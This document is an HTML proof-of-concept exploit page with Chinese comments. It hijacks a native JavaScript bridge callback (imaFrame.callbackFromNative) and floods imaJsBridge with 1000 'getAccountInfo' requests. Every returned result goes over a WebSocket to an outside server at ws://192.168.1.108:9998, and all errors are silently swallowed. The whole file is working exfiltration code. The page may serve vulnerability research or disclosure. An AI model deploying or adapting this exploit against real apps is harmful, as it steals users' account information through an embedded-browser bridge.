<!DOCTYPE html>
<html>

<head>
    <title>Poc - WebSocket版本</title>
</head>

<body>
    <button onclick="poc()">执行 POC - WebSocket版本2</button>

    <script>
        // WebSocket配置
        const WS_SERVER_URL = 'ws://192.168.1.108:9998';  // WebSocket服务器地址
        let websocket = null;
        let messageQueue = [];

        function initWebSocket() {
            if (websocket && websocket.readyState === WebSocket.OPEN) {
                return Promise.resolve();
            }
            
            if (websocket && websocket.readyState === WebSocket.CONNECTING) {
                return new Promise((resolve, reject) => {
                    websocket.onopen = () => resolve();
                    websocket.onerror = (error) => reject(error);
                });
            }

            return new Promise((resolve, reject) => {
                websocket = new WebSocket(WS_SERVER_URL);
                
                websocket.onopen = () => {
                    // 发送队列中的消息
                    while (messageQueue.length > 0) {
                        websocket.send(messageQueue.shift());
                    }
                    resolve();
                };

                websocket.onerror = (error) => {
                    reject(error);
                };

                websocket.onclose = () => {
                    websocket = null;
                };
            });
        }

        window.imaFrame = {
            callbackFromNative: function (callbackId, result) {
                // 测试数据，如果没有真实数据
                if (!result) {
                    result = "测试数据_" + Date.now();
                }
                sendToServerWS(callbackId, result);
            }
        };

        async function sendToServerWS(callbackId, result) {
            try {
                var payload = JSON.stringify({
                    callbackId: callbackId,
                    timestamp: Date.now(),
                    data: result
                });

                if (websocket && websocket.readyState === WebSocket.OPEN) {
                    // 直接发送，无需等待响应
                    websocket.send(payload);
                } else {
                    // 连接未建立，加入队列
                    messageQueue.push(payload);
                    if (!websocket || websocket.readyState === WebSocket.CLOSED) {
                        try {
                            await initWebSocket();
                        } catch (error) {
                            // 静默处理错误
                        }
                    }
                }
            } catch (error) {
                // 静默处理错误
            }
        }

        async function poc() {
            try {
                await initWebSocket();
                
                // 连接建立后立即快速发送
                for (var i = 0; i < 1000; i++) {
                    setTimeout(getAccountInfo, i / 20);
                }
            } catch (error) {
                // 静默处理错误
            }
        }
        
        function getAccountInfo() {
            try {
                if (imaJsBridge && imaJsBridge.invokeWithCallback) {
                    var callbackId = 'callback_' + Date.now() + '_' + Math.random();
                    var requestData = JSON.stringify({
                        action: "getAccountInfo",
                        callbackId: callbackId,
                        args: "{}"
                    });

                    window.imaJsBridge.invokeWithCallback(requestData);
                }
            } catch (error) {
                // 静默处理错误
            }
        }

        // 不在页面加载时自动初始化，只在需要时初始化

        // 页面卸载时关闭连接
        window.onbeforeunload = function() {
            if (websocket) {
                websocket.close();
            }
        };

    </script>
</body>

</html>
